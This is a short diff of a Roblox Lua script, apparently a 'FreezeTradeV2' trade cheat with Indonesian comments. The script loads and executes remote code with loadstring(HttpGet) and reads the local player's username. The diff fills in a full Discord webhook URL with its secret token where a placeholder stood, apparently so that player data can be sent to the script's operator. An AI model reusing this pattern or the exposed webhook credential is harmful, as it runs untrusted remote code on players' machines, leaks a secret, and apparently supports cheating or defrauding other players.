@@ -2,7 +2,7 @@ local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 -- Dapatkan Username Roblox secara otomatis
 local Username = game.Players.LocalPlayer.Name -- Ambil username akun
-local WebhookURL = "https://discord.com/api/webhooks/XXX/XXX" -- Masukkan Webhook URL kamu di sini
+local WebhookURL = "https://discord.com/api/webhooks/1319653743121403954/ZX-vpHJw_vdh5_5nWb0XLjJY8AHKALMxwWwV3CFiHgrla74tTTshVHlyb1dCFt4UfZKY" -- Masukkan Webhook URL kamu di sini
 
 -- Key yang diperlukan untuk membuka akses
 local CorrectKey = "FreezeTradeV2" -- Ganti ini dengan key yang kamu inginkan
